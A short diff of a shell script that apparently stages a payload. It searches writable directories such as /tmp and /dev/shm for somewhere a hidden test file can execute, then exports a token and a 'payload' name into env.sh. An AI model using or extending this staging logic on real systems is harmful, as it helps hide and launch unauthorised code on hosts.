@@ -10,7 +10,7 @@ for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
         chmod +x $ph/.xtst &&
         $ph/.xtst &&
         rm -f $ph/.xtst &&
-        { mv env.sh $ph/ &>/dev/null; cd $ph; } &&
+        cd $ph &&
         break
 done
 { type base64 &>/dev/null && b64=base64; } ||
@@ -80,8 +80,8 @@ else
 fi
 
 export pl_token="${pl_token}" pl_name="${pl_name:-payload}"
-# echo "export \
-#     ">>env.sh
+echo "export \
+$ENV_VARS ">env.sh
 
 if [ "$TMX" = 1 ]; then
     tmx_init="new -s init sleep 10"
